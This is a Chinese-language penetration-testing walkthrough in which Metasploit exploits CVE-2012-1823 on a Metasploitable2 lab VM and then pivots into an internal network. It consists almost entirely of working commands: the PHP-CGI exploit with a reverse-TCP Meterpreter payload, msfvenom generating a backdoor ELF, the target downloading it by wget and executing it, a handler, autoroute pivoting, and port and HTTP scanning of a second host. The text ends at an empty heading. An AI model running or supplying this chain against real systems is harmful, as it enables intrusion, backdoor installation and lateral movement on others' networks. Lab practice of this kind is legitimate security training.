# Metasploit攻击PHP-CGI查询字符串参数漏洞并渗透内网

攻击机：Kali 192.168.109.137

靶机： Metasploitable2 192.168.109.159

内网另一台主机 Windows Server 2012

工具：Metasploit

目标计算机上的漏洞编号为CVE id 2012-1823，完整的名称为PHP-CGI查询字符串参数漏洞，根据PHP主页的信息，当PHP使用基于CGI的设置(如Apache的mod_cgid)时，php-cgi就会收到一个查询字符串参数作为命令行参数(这个命令行参数可以是-s、-d或者-c),它将被传递到php-cgi程序，从而导致源代码泄露和任意代码执行。因此，一个远程的、未经授权的攻击者可以借此获取敏感信息，利用目标计算机来进行Dos攻击，或者取得Web服务器执行任意代码的权限。

## 开启MSF

```
msfconsole
```

## 查找MSF中与CVE id 2012-1823漏洞匹配的模块

```
search "php 5.2.4"
```

## 对漏洞进行渗透

```
use exploit/multi/http/php_cgi_arg_injection
show options
set RHOST 192.168.109.159
show options
show payloads
set payload php/meterpreter/reverse_tcp
show options
set LHOST 192.168.109.137
exploit
```

现在，我们攻克了IP地址为192.168.109.159的内部系统了，现在我们需要将Meterpreter提升为更高的权限

## 生成木马文件

在攻击机Kali上新开一个命令行终端，执行如下命令：

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST 192.168.109.137 LPORT 4444 -f elf > backdoor.elf
```

注：elf是Linux系统下的默认扩展名

## 启动Kali上的Apache服务并将backdoor.elf放置到服务器中

```
service apache2 start
mv backdoor.elf /var/www/html/
```

这样，就可以让目标系统从我们的计算机中下载这个木马文件了。

## 在目标机上下载木马文件

切换到第3步的终端，执行命令：

```
shell
wget http://192.168.109.137/backdoor.elf
```

即将木马文件下载到了目标机上

## 在新开启的终端上执行如下命令

```
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.109.137
set LPORT 4444
exploit
```

## 在目标机上运行木马文件

切换到第3步的终端，执行命令：

```
chmod 7777 backdoor.elf
./backdoor.elf
```

## 查看反弹的Meterpreter终端

回到新开启的终端上查看，此时，我们看到已经反弹回Meterpreter命令行了。

接下来，就可以在Meterpreter终端进行操作了。

**下面，我们渗透内部网络。**

## 查看ARP内容

```
arp
```

由输出可以看出，内网中有另一主机IP地址为：192.168.109.141

为了渗透进入这个内部网络，需要在成功渗透的主机上使用autoroute命令来设置跳板。

## 设置跳板

在Meterpreter终端执行：

```
run autoroute -p
run autoroute -s 192.168.109.0 255.255.255.0
run autoroute -p
```

此时，我们的MSF就可以通过这个Meterpreter会话连接到内部网络。

## 将Meterpreter会话切换到后台

```
background
```

## 内网主机192.168.109.141进行端口扫描

```
use auxiliary/scanner/portscan/tcp
show options
setg RHOSTS 192.168.109.141
run
```

注意：设置RHOSTS的值时，这里使用的是setg命令，这样就会使RHOSTS的值设置为全局的192.168.109.141，从而无需反复输入这个命令。

这里，我们仅仅看到少数几个开发的端口，接下来，我们使用MSF中对应工具对常见的端口再进行详细的扫描。使用auxiliary/scanner/http/http_header模块对目标80和8080端口进行扫描，以发现在这两个端口上运行的服务。

## 查看在80、8080端口上运行的服务

```
use auxiliary/scanner/http/http_header
set RHOSTS 192.168.109.141
set HTTP_METHOD GET
run
set RPORT 8080
run
```

从输出中可以看到，目标计算机80端口上运行着最新的IIS 8.5, 这是一个很难渗透的服务器，因为并没有在这个服务器上发现高危的漏洞。不过，在8080端口上运行着HFS 2.3，这个软件存在着一个远程代码执行漏洞。

## 